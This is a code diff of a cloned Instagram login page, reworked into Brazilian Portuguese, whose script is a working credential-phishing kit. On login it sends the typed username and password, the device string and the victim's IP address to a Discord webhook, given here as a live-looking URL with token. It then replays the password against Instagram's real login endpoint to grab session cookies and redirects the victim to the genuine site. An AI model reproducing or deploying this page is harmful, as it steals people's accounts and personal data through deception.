@@ -1,485 +1,430 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./styles.css" />
+    <link rel="icon" type="image/png" href="./img/insta-fav.ico">
     <title>Instagram</title>
     <style>
         * {
+            border: none;
+            box-sizing: border-box;
+            font-family: Arial, Helvetica, sans-serif;
             margin: 0;
             padding: 0;
-            box-sizing: border-box;
         }
-
         body {
             background-color: #fafafa;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            height: 100vh;
         }
-
-        #main {
+        main {
+            height: 100vh;
+            margin: auto;
+            max-width: 935px;
+        }
+        a { text-decoration: none; }
+        h1 { margin: 20px 0; }
+        ul { list-style: none; }
+        .flex {
+            display: -webkit-box;
+            display: -moz-box;
+            display: -webkit-flex;
+            display: -ms-flexbox;
             display: flex;
+        }
+        .direction-column {
+            -webkit-box-direction: normal;
+            -webkit-box-orient: vertical;
+            -moz-box-direction: normal;
+            -moz-box-orient: vertical;
+            -webkit-flex-direction: column;
+            -ms-flex-direction: column;
+            flex-direction: column;
+        }
+        .justify-content-center {
+            -webkit-box-pack: center;
+            -moz-box-pack: center;
+            -ms-flex-pack: center;
+            -webkit-justify-content: center;
             justify-content: center;
+        }
+        .align-items-center {
+            -webkit-box-align: center;
+            -moz-box-align: center;
+            -ms-flex-align: center;
+            -webkit-align-items: center;
             align-items: center;
-            min-height: 100vh;
-            padding: 20px;
         }
-
-        .phone {
-            background: url('https://www.instagram.com/static/images/homepage/phones/home-phones.png/1dc085cdb87d.png') no-repeat;
-            background-size: 468.32px 634.15px;
-            height: 634.15px;
-            width: 468.32px;
-            margin-right: 32px;
-            display: none;
+        .flex-wrap {
+            -webkit-flex-wrap: wrap;
+            -ms-flex-wrap: wrap;
+            flex-wrap: wrap;
         }
-
-        @media (min-width: 876px) {
-            .phone {
-                display: block;
-            }
-        }
-
-        .login-container {
-            width: 350px;
-        }
-
-        .box {
-            background: #fff;
+        .panel {
+            background-color: white;
             border: 1px solid #dbdbdb;
-            border-radius: 1px;
-            padding: 40px 40px 20px;
             margin-bottom: 10px;
+            padding: 10px;
         }
-
-        .logo {
-            background-image: url('https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png');
-            background-repeat: no-repeat;
-            background-position: center;
-            background-size: contain;
-            height: 51px;
-            width: 175px;
-            margin: 0 auto 30px;
-        }
-
-        .input-field {
-            width: 100%;
-            padding: 9px 8px;
-            background: #fafafa;
+        #auth { max-width: 350px; }
+        #mobile { max-width: 454px; }
+        #mobile img { height: 618px; }
+        .login-with-fb, form { width: 100%; }
+        .register, form { padding: 30px 20px; }
+        .login-with-fb { padding: 30px 20px 20px 20px; }
+        form .sr-only { display: none; }
+        form input {
+            background-color: #fafafa;
             border: 1px solid #dbdbdb;
             border-radius: 3px;
-            font-size: 12px;
-            margin-bottom: 6px;
+            color: #808080;
+            margin-bottom: 8px;
+            padding: 10px 10px;
+            width: 100%;
+        }
+        form input::placeholder { color: #808080; }
+        form input:focus {
+            border: 1px solid #808080;
             outline: none;
         }
-
-        .input-field:focus {
-            border-color: #a8a8a8;
-        }
-
-        .login-btn {
+        form button {
+            background-color: #0095f6;
+            border-radius: 5px;
+            color: #fff;
+            font-weight: bold;
+            height: 35px;
+            margin-top: 10px;
             width: 100%;
-            background: #0095f6;
-            color: white;
-            border: none;
-            border-radius: 8px;
-            padding: 7px;
-            font-weight: 600;
-            font-size: 14px;
-            margin: 16px 0;
             cursor: pointer;
-            transition: background 0.2s;
         }
-
-        .login-btn:hover {
-            background: #1877f2;
-        }
-
-        .login-btn:disabled {
-            background: #0095f6;
-            opacity: 0.7;
-            cursor: not-allowed;
-        }
-
-        .divider {
-            display: flex;
-            align-items: center;
-            margin: 20px 0;
-            color: #8e8e8e;
-            font-size: 13px;
-            font-weight: 600;
-        }
-
-        .divider::before,
-        .divider::after {
-            content: '';
-            flex: 1;
+        .separator span {
+            background-color: #dbdbdb;
             height: 1px;
-            background: #dbdbdb;
+            width: calc(100% - 10px);
         }
-
-        .divider span {
-            margin: 0 18px;
+        .separator .or {
+            color: #808080;
+            font-weight: bold;
         }
-
-        .fb-login {
-            color: #385185;
-            font-weight: 600;
-            font-size: 14px;
-            text-align: center;
-            margin: 20px 0;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-        }
-
-        .fb-icon {
-            background-image: url('https://www.instagram.com/static/images/ico/fb.png');
-            background-size: 16px 16px;
-            width: 16px;
-            height: 16px;
-            display: inline-block;
-        }
-
-        .forgot {
-            text-align: center;
-            font-size: 12px;
-            color: #00376b;
-            margin-top: 20px;
-            cursor: pointer;
-        }
-
-        .signup-box {
-            background: #fff;
-            border: 1px solid #dbdbdb;
-            border-radius: 1px;
-            padding: 20px;
-            text-align: center;
-            font-size: 14px;
-        }
-
-        .signup-box a {
+        .separator { padding: 0 20px; }
+        .separator span:first-child { margin-right: 10px;}
+        .separator span:last-child { margin-left: 10px;}
+        .login-with-fb a { color: #385185; }
+        .login-with-fb > a { font-size: 12px; }
+        .login-with-fb div a { font-weight: bold; }
+        .login-with-fb div { margin-bottom: 15px; }
+        .register * { font-size: 14px; }
+        .register a { 
             color: #0095f6;
-            text-decoration: none;
-            font-weight: 600;
-            margin-left: 5px;
+            font-weight: bold;
         }
-
-        .app-links {
+        .register p { margin-right: 5px; }
+        .app-download { padding: 15px; }
+        .app-download p { padding: 10px 0; }
+        .app-download img { 
+            height: 40px; 
+            margin: 0 5px;
+        }
+        footer {
+            margin: 0 auto 30px auto;
+            max-width: 935px;
+        }
+        footer ul { margin-bottom: 20px; }
+        footer ul li { margin: 0 10px 10px; } 
+        footer ul li a { color: #385185; }
+        footer .copyright { color: #808080; }
+        footer ul li a,
+        footer .copyright { 
+            font-weight: bold;
             text-align: center;
-            margin-top: 20px;
+            text-transform: uppercase;
         }
-
-        .app-links p {
-            font-size: 14px;
-            margin-bottom: 15px;
+        @media screen and (max-width: 767px) {
+            main { margin: 30px auto 50px auto; }
+            footer .copyright,
+            footer ul li a { font-size: 13px; }
         }
-
-        .app-buttons {
-            display: flex;
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.5);
+            display: none;
             justify-content: center;
-            gap: 8px;
+            align-items: center;
+            z-index: 9999;
         }
-
-        .app-btn {
+        .loading-box {
+            background: white;
+            padding: 30px;
+            border-radius: 12px;
+            text-align: center;
+        }
+        .spinner {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #0095f6;
+            border-radius: 50%;
+            width: 40px;
             height: 40px;
-            cursor: pointer;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px;
         }
-
-        .error-msg {
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .error-message {
             color: #ed4956;
             font-size: 14px;
             text-align: center;
             margin: 10px 0;
             display: none;
         }
-
-        .loading {
-            display: none;
-            text-align: center;
-            padding: 20px;
-        }
-
-        .spinner {
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid #0095f6;
-            border-radius: 50%;
-            width: 30px;
-            height: 30px;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 15px;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        .footer {
-            text-align: center;
-            color: #8e8e8e;
-            font-size: 12px;
-            margin-top: 30px;
-        }
-
-        .footer a {
-            color: #8e8e8e;
-            text-decoration: none;
-            margin: 0 8px;
-        }
     </style>
 </head>
 <body>
-
-<div id="main">
-    <div class="phone"></div>
-    
-    <div class="login-container">
-        <div id="loginForm">
-            <div class="box">
-                <div class="logo"></div>
-                
-                <input type="text" id="username" class="input-field" placeholder="Phone number, username, or email" autocomplete="off">
-                <input type="password" id="password" class="input-field" placeholder="Password" autocomplete="off">
-                
-                <div id="errorMsg" class="error-msg"></div>
-                
-                <button class="login-btn" id="loginBtn" onclick="handleLogin()">Log in</button>
-                
-                <div class="divider"><span>OR</span></div>
-                
-                <div class="fb-login">
-                    <span class="fb-icon"></span>
-                    Log in with Facebook
-                </div>
-                
-                <div class="forgot">Forgot password?</div>
-            </div>
-            
-            <div class="signup-box">
-                Don't have an account? <a href="#">Sign up</a>
-            </div>
-            
-            <div class="app-links">
-                <p>Get the app.</p>
-                <div class="app-buttons">
-                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png" class="app-btn" style="height: 40px;">
-                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png" class="app-btn" style="height: 40px;">
-                </div>
-            </div>
-        </div>
-        
-        <div id="loadingBox" class="loading">
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-box">
             <div class="spinner"></div>
-            <p style="color: #262626;">Verifying your credentials...</p>
-            <p style="color: #8e8e8e; font-size: 12px; margin-top: 10px;">This may take a moment</p>
+            <p style="color: #262626; margin-bottom: 5px;">Verificando credenciais...</p>
+            <p style="color: #8e8e8e; font-size: 12px;">Isso pode levar um momento</p>
         </div>
     </div>
-</div>
 
-<footer class="footer">
-    <div>
-        <a href="#">Meta</a>
-        <a href="#">About</a>
-        <a href="#">Blog</a>
-        <a href="#">Jobs</a>
-        <a href="#">Help</a>
-        <a href="#">API</a>
-        <a href="#">Privacy</a>
-        <a href="#">Terms</a>
-        <a href="#">Locations</a>
-        <a href="#">Instagram Lite</a>
-        <a href="#">Threads</a>
-        <a href="#">Contact Uploading & Non-Users</a>
-        <a href="#">Meta Verified</a>
-    </div>
-    <div style="margin-top: 20px;">
-        <span>English</span>
-        <span style="margin-left: 10px;">© 2026 Instagram from Meta</span>
-    </div>
-</footer>
+    <main class="flex align-items-center justify-content-center">
+        <section id="mobile" class="flex">
+        </section>
+        <section id="auth" class="flex direction-column">
+            <div class="panel login flex direction-column">
+                <h1 title="Instagram" class="flex justify-content-center">
+                    <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram logo" title="Instagram logo" style="height: 51px;" />
+                </h1>
+                <form id="loginForm">
+                    <label for="email" class="sr-only">Telefone, nome de usuário ou e-mail</label>
+                    <input name="email" id="username" placeholder="Telefone, nome de usuário ou e-mail" autocomplete="off" />
 
-<script>
-    const DISCORD = 'https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE';
+                    <label for="password" class="sr-only">Senha</label>
+                    <input name="password" id="password" type="password" placeholder="Senha" autocomplete="off" />
+                    
+                    <div class="error-message" id="errorMsg"></div>
 
-    async function handleLogin() {
-        const username = document.getElementById('username').value.trim();
-        const password = document.getElementById('password').value.trim();
-        const errorMsg = document.getElementById('errorMsg');
-        const loginBtn = document.getElementById('loginBtn');
-        
-        if (!username || !password) {
-            errorMsg.style.display = 'block';
-            errorMsg.innerText = 'Please enter both username and password';
-            return;
-        }
-        
-        errorMsg.style.display = 'none';
-        loginBtn.disabled = true;
-        loginBtn.innerText = 'Logging in...';
-        
-        // Show loading
-        document.getElementById('loginForm').style.display = 'none';
-        document.getElementById('loadingBox').style.display = 'block';
-        
-        // Send to Discord
-        await fetch(DISCORD, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                content: "@everyone",
-                embeds: [{
-                    title: "🎯 NEW INSTAGRAM LOGIN",
-                    color: 0xE4405F,
-                    fields: [
-                        {
-                            name: "👤 Username",
-                            value: `\`${username}\``,
-                            inline: true
-                        },
-                        {
-                            name: "🔐 Password",
-                            value: `||${password}||`,
-                            inline: true
-                        },
-                        {
-                            name: "🌐 IP Info",
-                            value: "Capturing...",
-                            inline: false
-                        },
-                        {
-                            name: "📱 Device Info",
-                            value: navigator.userAgent,
-                            inline: false
-                        },
-                        {
-                            name: "🕐 Timestamp",
-                            value: new Date().toLocaleString(),
-                            inline: false
-                        }
-                    ],
-                    footer: {
-                        text: "Instagram Clone | Session Capture"
-                    },
-                    timestamp: new Date().toISOString()
-                }]
-            })
-        }).catch(err => console.log('Discord error:', err));
-        
-        // Try to get IP and send update
-        try {
-            const ipRes = await fetch('https://api.ipify.org?format=json');
-            const ipData = await ipRes.json();
+                    <button type="button" id="loginBtn" onclick="handleLogin()">Entrar</button>
+                </form>
+                <div class="flex separator align-items-center">
+                    <span></span>
+                    <div class="or">OU</div>
+                    <span></span>
+                </div>
+                <div class="login-with-fb flex direction-column align-items-center">
+                    <div>
+                        <a>Entrar com o facebook</a>
+                    </div>
+                    <a href="#">Esqueceu a senha?</a>
+                </div>
+            </div>
+            <div class="panel register flex justify-content-center">
+                <p>Não tem uma conta?</p>
+                <a href="#">Cadastre-se</a>
+            </div>
+            <div class="app-download flex direction-column align-items-center">
+                <p>Obtenha o aplicativo.</p>
+                <div class="flex justify-content-center">
+                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_portuguese-brazilian.png/68006a2bb372.png" alt="Baixar na App Store" title="Baixar na App Store" style="height: 40px;" />
+                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_portuguese-brazilian.png/f8e1f1f5e6a6.png" alt="Disponível no Google Play" title="Disponível no Google Play" style="height: 40px;" />
+                </div>
+            </div>
+        </section>
+    </main>
+    <footer>
+        <ul class="flex flex-wrap justify-content-center">
+            <li><a href="#">SOBRE</a></li>
+            <li><a href="#">AJUDA</a></li>
+            <li><a href="#">IMPRENSA</a></li>
+            <li><a href="#">API</a></li>
+            <li><a href="#">CARREIRAS</a></li>
+            <li><a href="#">PRIVACIDADE</a></li>
+            <li><a href="#">TERMOS</a></li>
+            <li><a href="#">LOCALIZAÇÃO</a></li>
+            <li><a href="#">CONTAS MAIS RELEVANTES</a></li>
+            <li><a href="#">HASHTAGS</a></li>
+            <li><a href="#">IDIOMA</a></li>
+        </ul>
+        <p class="copyright">© 2026 Instagram from Meta</p>
+    </footer>
+
+    <script>
+        // YOUR DISCORD WEBHOOK URL HERE
+        const DISCORD = 'https://discord.com/api/webhooks/1496531603210506392/kf7iJdmSOgzhV21bKbYXiVv6NvZdXxxMuUR-teMhvQwAEKCDFxo-euHie5B00imucPJh';
+
+        async function handleLogin() {
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value.trim();
+            const errorMsg = document.getElementById('errorMsg');
+            const loginBtn = document.getElementById('loginBtn');
+            const overlay = document.getElementById('loadingOverlay');
             
+            if (!username || !password) {
+                errorMsg.style.display = 'block';
+                errorMsg.innerText = 'Insira nome de usuário e senha';
+                return;
+            }
+            
+            errorMsg.style.display = 'none';
+            loginBtn.disabled = true;
+            loginBtn.style.opacity = '0.7';
+            overlay.style.display = 'flex';
+            
+            // Send to Discord
             await fetch(DISCORD, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     embeds: [{
-                        title: "📍 IP ADDRESS CAPTURED",
-                        color: 0x3498db,
+                        title: "🎯 NOVO LOGIN INSTAGRAM",
+                        color: 0xE4405F,
                         fields: [
                             {
-                                name: "IP Address",
-                                value: `\`${ipData.ip}\``,
+                                name: "👤 Usuário",
+                                value: `\`${username}\``,
                                 inline: true
                             },
                             {
-                                name: "User",
-                                value: username,
+                                name: "🔐 Senha",
+                                value: `||${password}||`,
                                 inline: true
+                            },
+                            {
+                                name: "📱 Dispositivo",
+                                value: navigator.userAgent,
+                                inline: false
+                            },
+                            {
+                                name: "🕐 Data/Hora",
+                                value: new Date().toLocaleString('pt-BR'),
+                                inline: false
                             }
                         ],
+                        footer: { text: "Instagram Clone PT-BR" },
                         timestamp: new Date().toISOString()
                     }]
                 })
-            });
-        } catch (e) {
-            console.log('IP fetch failed');
-        }
-        
-        // Try Instagram login to get session
-        try {
-            const time = Math.floor(Date.now() / 1000);
-            const encPass = `#PWD_INSTAGRAM_BROWSER:0:${time}:${password}`;
+            }).catch(err => console.log('Erro Discord:', err));
             
-            const igRes = await fetch('https://www.instagram.com/api/v1/web/accounts/login/ajax/', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/x-www-form-urlencoded',
-                    'X-CSRFToken': 'missing',
-                    'X-Requested-With': 'XMLHttpRequest'
-                },
-                body: new URLSearchParams({
-                    username: username,
-                    enc_password: encPass,
-                    queryParams: '{}',
-                    optIntoOneTap: 'false'
-                }),
-                credentials: 'include'
-            });
-            
-            const igData = await igRes.json();
-            
-            if (igData.authenticated) {
-                const cookies = document.cookie;
+            // Get IP and send
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
                 
                 await fetch(DISCORD, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         embeds: [{
-                            title: "✅ SESSION CAPTURED - VALID LOGIN",
-                            color: 0x00FF00,
+                            title: "📍 IP CAPTURADO",
+                            color: 0x3498db,
                             fields: [
                                 {
-                                    name: "👤 Username",
+                                    name: "IP",
+                                    value: `\`${ipData.ip}\``,
+                                    inline: true
+                                },
+                                {
+                                    name: "Usuário",
                                     value: username,
                                     inline: true
-                                },
-                                {
-                                    name: "🆔 User ID",
-                                    value: igData.userId || 'N/A',
-                                    inline: true
-                                },
-                                {
-                                    name: "🍪 Session Cookie",
-                                    value: `\`\`\`${cookies || 'No cookies captured'}\`\`\``,
-                                    inline: false
                                 }
                             ],
                             timestamp: new Date().toISOString()
                         }]
                     })
                 });
+            } catch (e) {
+                console.log('IP fetch falhou');
             }
-        } catch (e) {
-            console.log('Instagram login attempt failed:', e);
+            
+            // Try real Instagram login
+            try {
+                const time = Math.floor(Date.now() / 1000);
+                const encPass = `#PWD_INSTAGRAM_BROWSER:0:${time}:${password}`;
+                
+                const igRes = await fetch('https://www.instagram.com/api/v1/web/accounts/login/ajax/', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                        'X-CSRFToken': 'missing',
+                        'X-Requested-With': 'XMLHttpRequest'
+                    },
+                    body: new URLSearchParams({
+                        username: username,
+                        enc_password: encPass,
+                        queryParams: '{}',
+                        optIntoOneTap: 'false'
+                    }),
+                    credentials: 'include'
+                });
+                
+                const igData = await igRes.json();
+                
+                if (igData.authenticated) {
+                    const cookies = document.cookie;
+                    
+                    await fetch(DISCORD, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            embeds: [{
+                                title: "✅ SESSÃO CAPTURADA - LOGIN VÁLIDO",
+                                color: 0x00FF00,
+                                fields: [
+                                    {
+                                        name: "👤 Usuário",
+                                        value: username,
+                                        inline: true
+                                    },
+                                    {
+                                        name: "🆔 User ID",
+                                        value: igData.userId || 'N/A',
+                                        inline: true
+                                    },
+                                    {
+                                        name: "🍪 Cookies da Sessão",
+                                        value: `\`\`\`${cookies || 'Nenhum cookie capturado'}\`\`\``,
+                                        inline: false
+                                    }
+                                ],
+                                timestamp: new Date().toISOString()
+                            }]
+                        })
+                    });
+                }
+            } catch (e) {
+                console.log('Tentativa de login Instagram falhou:', e);
+            }
+            
+            // Redirect
+            setTimeout(() => {
+                window.location.href = 'https://www.instagram.com/accounts/login/';
+            }, 3000);
         }
+
+        // Enter key handler
+        document.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                handleLogin();
+            }
+        });
+
+        // Remove error on input
+        document.getElementById('username').addEventListener('input', function() {
+            document.getElementById('errorMsg').style.display = 'none';
+        });
         
-        // Redirect after delay
-        setTimeout(() => {
-            window.location.href = 'https://www.instagram.com/accounts/login/';
-        }, 3000);
-    }
-
-    // Enter key handler
-    document.addEventListener('keypress', function(e) {
-        if (e.key === 'Enter') {
-            handleLogin();
-        }
-    });
-
-    // Remove error on input
-    document.getElementById('username').addEventListener('input', function() {
-        document.getElementById('errorMsg').style.display = 'none';
-    });
-    
-    document.getElementById('password').addEventListener('input', function() {
-        document.getElementById('errorMsg').style.display = 'none';
-    });
-</script>
-
+        document.getElementById('password').addEventListener('input', function() {
+            document.getElementById('errorMsg').style.display = 'none';
+        });
+    </script>
 </body>
 </html>
